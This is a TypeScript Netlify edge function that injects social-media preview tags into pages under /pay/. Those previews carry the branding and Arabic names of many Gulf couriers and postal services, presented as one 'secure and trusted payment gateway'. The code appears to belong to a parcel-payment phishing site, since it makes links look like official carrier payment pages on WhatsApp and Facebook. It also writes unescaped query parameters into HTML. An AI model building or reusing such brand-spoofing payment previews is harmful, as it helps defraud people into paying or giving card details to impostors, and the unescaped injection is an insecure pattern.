// Netlify Edge Function to inject Open Graph meta tags server-side
// This runs BEFORE JavaScript and ensures social media crawlers see correct OG tags

export default async function handler(request: Request, context: { next: () => Promise<Response> }) {
  try {
    // Get the URL and query parameters
    const url = new URL(request.url);
    const company = url.searchParams.get('company') || 'aramex';
    const title = url.searchParams.get('title');
    const currency = url.searchParams.get('currency');
    const path = url.pathname;

    // Only process /pay/* paths
    if (!path.startsWith('/pay/')) {
      return context.next();
    }

    console.log('OG Injector: Processing', { path, company, title, currency });

    // Fetch the original HTML
    const response = await context.next();
    const html = await response.text();

    // Get the current domain dynamically
    const origin = url.origin;

    // Company to OG image mapping (using correct .jpg extension and dynamic domain)
    const companyImages: Record<string, string> = {
      'aramex': `${origin}/og-aramex.jpg`,
      'dhl': `${origin}/og-dhl.jpg`,
      'dhlkw': `${origin}/og-dhl.jpg`,
      'dhlqa': `${origin}/og-dhl.jpg`,
      'dhlom': `${origin}/og-dhl.jpg`,
      'dhlbh': `${origin}/og-dhl.jpg`,
      'fedex': `${origin}/og-fedex.jpg`,
      'ups': `${origin}/og-ups.jpg`,
      'empost': `${origin}/og-empost.jpg`,
      'smsa': `${origin}/og-smsa.jpg`,
      'zajil': `${origin}/og-zajil.jpg`,
      'naqel': `${origin}/og-naqel.jpg`,
      'saudipost': `${origin}/og-saudipost.jpg`,
      'kwpost': `${origin}/og-kwpost.jpg`,
      'qpost': `${origin}/og-qpost.jpg`,
      'omanpost': `${origin}/og-omanpost.jpg`,
      'bahpost': `${origin}/og-bahpost.jpg`
    };

    // Get OG image for the company, fallback to aramex
    const ogImage = companyImages[company.toLowerCase()] || `${origin}/og-aramex.jpg`;

    // Company display names
    const companyNames: Record<string, string> = {
      'aramex': 'أرامكس',
      'dhl': 'دي إتش إل',
      'dhlkw': 'دي إتش إل الكويت',
      'dhlqa': 'دي إتش إل قطر',
      'dhlom': 'دي إتش إل عُمان',
      'dhlbh': 'دي إتش إل البحرين',
      'fedex': 'فيديكس',
      'ups': 'يو بي إس',
      'empost': 'البريد الإماراتي',
      'smsa': 'سمسا',
      'zajil': 'زاجل',
      'naqel': 'ناقل',
      'saudipost': 'البريد السعودي',
      'kwpost': 'البريد الكويتي',
      'qpost': 'البريد القطري',
      'omanpost': 'البريد العُماني',
      'bahpost': 'البريد البحريني'
    };

    const companyName = companyNames[company.toLowerCase()] || company;

    // Generate dynamic title and description
    const ogTitle = title || `${companyName} - إكمال الدفع`;
    const ogDescription = currency
      ? `إكمال دفع ${companyName} بـ ${currency} - بوابة دفع آمنة وموثوقة`
      : `إكمال دفع ${companyName} - بوابة دفع آمنة وموثوقة`;
    const ogUrl = url.href;

    // Generate OG meta tags
    const ogTags = `
    <!-- Open Graph / Facebook / WhatsApp - Server Injected -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content="${ogUrl}" />
    <meta property="og:title" content="${ogTitle}" />
    <meta property="og:description" content="${ogDescription}" />
    <meta property="og:image" content="${ogImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:alt" content="${companyName} Payment Gateway" />
    <meta property="og:site_name" content="Gulf Payment Gateway" />
    <meta property="og:locale" content="ar_AR" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${ogTitle}" />
    <meta name="twitter:description" content="${ogDescription}" />
    <meta name="twitter:image" content="${ogImage}" />
    <meta name="twitter:image:alt" content="${companyName} Payment Gateway" />
    `;

    // Remove existing OG tags (if any) and inject new ones
    // This regex removes existing OG and Twitter meta tags
    let modifiedHtml = html.replace(
      /<meta\s+(?:property|name)=["']\w*og:\w*["'][^>]*>\s*/gi,
      ''
    ).replace(
      /<meta\s+name=["']twitter:\w*["'][^>]*>\s*/gi,
      ''
    );

    // Inject new OG tags after <head> tag
    modifiedHtml = modifiedHtml.replace(
      /<head[^>]*>/i,
      (match) => `${match}\n${ogTags.trim()}`
    );

    console.log('OG Injector: Injected tags for', { company, currency, title: ogTitle, ogImage });

    // Return modified HTML with same headers
    return new Response(modifiedHtml, {
      status: response.status,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN'
      }
    });

  } catch (error) {
    console.error('OG Injector Error:', error);
    // If anything goes wrong, fall back to original response
    return context.next();
  }
}
